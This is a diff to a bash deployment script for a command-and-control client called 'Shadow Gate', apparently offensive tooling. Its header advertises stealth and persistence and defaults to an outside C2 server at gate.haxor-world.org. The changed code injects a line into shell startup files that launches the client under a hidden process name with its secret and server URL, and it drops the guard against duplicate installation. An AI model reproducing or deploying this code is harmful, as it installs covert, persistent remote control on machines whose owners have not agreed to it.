@@ -1,4 +1,31 @@
+
 #!/usr/bin/env bash
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# Rust C2 Framework - Client Deployment System
+# ═══════════════════════════════════════════════════════════════════════════════
+# 
+# A sophisticated deployment framework for Rust C2 client with advanced
+# stealth capabilities and persistence mechanisms.
+#
+# Usage Examples:
+#   $ bash deploy.sh
+#   $ SECRET="your_secret" bash deploy.sh
+#   $ SERVER_URL="http://your-server:8080" SECRET="your_secret" bash deploy.sh
+#   $ BINARY_URL="https://example.com/shadowgate-linux-x86_64" SECRET="your_secret" bash deploy.sh
+
+#   $ DEBUG=1 SECRET="your_secret" bash deploy.sh
+#
+# Environment Variables:
+#   SECRET          - Required encryption secret for C2 communication
+#   SERVER_URL      - C2 server URL (default: https://gate.haxor-world.org)
+#   BINARY_URL      - Custom binary download URL
+
+#   DEBUG           - Enable verbose debugging output
+#   NO_INSTALL      - Skip persistence installation
+#   STEALTH_MODE    - Enable stealth features (default: enabled)
+#
+# ═══════════════════════════════════════════════════════════════════════════════
 
 [[ -z $ERR_LOG ]] && ERR_LOG="/dev/null"
 
@@ -250,23 +277,11 @@ install_init_scripts() {
 		return 1
 	fi
 	
-	# Check if Shadow Gate with same process name is already installed
-	for target in "${inject_targets[@]}"; do
-		[[ ! -f "$target" ]] && continue
-		if grep -q "${PROC_HIDDEN_NAME}" "$target" &>"$ERR_LOG"; then
-			print_status "!! WARNING !! Shadow Gate client with process name '${PROC_HIDDEN_NAME}' already installed via $(basename "$target")"
-			print_status "Installation aborted to prevent conflicts"
-			return 1
-		fi
-	done
-	
 	# Build environment variables string
 	local env_vars="SECRET='${SECRET}'"
 	[[ -n "${SERVER_URL}" ]] && env_vars="${env_vars} SERVER_URL='${SERVER_URL}'"
 	INJECT_LINE="
-if ! pgrep -f '${PROC_HIDDEN_NAME}' >/dev/null 2>&1; then
-	set +m; HOME=$HOME ${env_vars} $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${CLIENT_PATH}\" &>/dev/null &
-fi"
+HOME=$HOME ${env_vars} $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${CLIENT_PATH}\" &>/dev/null &"
 	for target in "${inject_targets[@]}"; do
 		[[ ! -f $target ]] && continue
 		print_progress "Installing access via $(basename "$target")"
@@ -282,7 +297,9 @@ fi"
 }
 
 install() {
-	[[ -n $NO_INSTALL ]] && print_status "NO_INSTALL is set. Skipping installation." && return 0
+	if [[ -n $NO_INSTALL ]]; then
+		print_status "NO_INSTALL is set. Skipping installation." && return 0
+	fi
 	print_progress "Installing Rust C2 client permanently" && print_ok
   
 	local is_installed=false
